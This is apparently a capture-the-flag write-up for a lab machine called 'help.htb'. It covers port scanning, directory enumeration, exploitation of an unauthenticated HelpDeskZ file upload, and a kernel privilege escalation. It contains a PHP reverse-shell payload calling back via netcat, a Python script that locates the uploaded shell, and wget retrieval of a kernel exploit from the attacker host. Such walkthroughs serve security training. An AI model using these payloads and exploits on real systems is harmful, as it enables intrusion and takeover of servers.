## Full TCP Port Scan (Aggressive) [65s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.230.159
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-04-02 10:25 EDT
Nmap scan report for 10.129.230.159
Host is up (0.070s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Device type: general purpose
Running: Linux 5.X
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   59.47 ms 10.10.16.1
2   31.33 ms 10.129.230.159

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 62.66 seconds
```

## Enumeration

### Port 80 (HTTP)
- Redirects to `http://help.htb`
- Add to `/etc/hosts`:
  ```bash
  echo "10.129.230.159 help.htb" | sudo tee -a /etc/hosts
  ```

### Web Directory Scanning
```bash
gobuster dir -u http://help.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
```
```text
/support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
```

### HelpDeskZ (v1.0.2)
- Located at `http://help.htb/support/`
- Vulnerable to unauthenticated file upload (CVE-2015-0932)

## Exploitation

### Reverse Shell Preparation
Create `shell.php`:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.27 1234 >/tmp/f"); ?>
```

### Exploit Script Execution
Modified Python3 script (`exploit.py`):
```python
#!/usr/bin/env python3
import hashlib
import time
import calendar
import sys
import requests

if len(sys.argv) < 3:
    print("Usage: {} <target_ip> <filename> [<time_window_in_seconds>]".format(sys.argv[0]))
    sys.exit(1)

target_ip = sys.argv[1]
fileName = sys.argv[2]
time_window = 600 if len(sys.argv) < 4 else int(sys.argv[3])

time_url = f"http://{target_ip}/support/"
base_url = f"http://{target_ip}/support/uploads/tickets/"

response = requests.head(time_url)
serverTime = response.headers['Date']
FormatTime = '%a, %d %b %Y %H:%M:%S %Z'
currentTime = int(calendar.timegm(time.strptime(serverTime, FormatTime)))

print(f"Server time (epoch): {currentTime}")
print(f"Checking over a time window of {time_window} seconds.")

for x in range(0, time_window):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext.encode()).hexdigest()
    url = base_url + md5hash + '.php'
    resp = requests.head(url)
    if resp.status_code == 200:
        print(f"Found! Shell URL: {url}")
        sys.exit(0)

print("File not found within the time window.")
```

Run the exploit:
```bash
python3 exploit.py help.htb shell.php 600
```

Start listener:
```bash
nc -lvnp 1234
```

### Reverse Shell Connection
```text
connect to [10.10.16.27] from (UNKNOWN) [10.129.230.159] 38554
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
help@help:/$ 
```

### User Flag
```bash
help@help:~$ cat user.txt
d4e4**************************
```

## Privilege Escalation

### Kernel Analysis
```bash
help@help:~$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
- Vulnerable to CVE-2017-16995 (Ubuntu privilege escalation)

### Kernel Exploit
Transfer exploit code:
```bash
wget http://10.10.16.27/exploit.c -O /tmp/exploit.c
```

Compile and run:
```bash
cd /tmp
gcc -o exploit exploit.c
./exploit
```

### Root Shell
```text
task_struct = ffff8800368cf000
uidptr = ffff88003701b784
spawning root shell
root@help:/tmp# 
```

### Root Flag
```bash
root@help:~# cat /root/root.txt
4e93*****************************
```
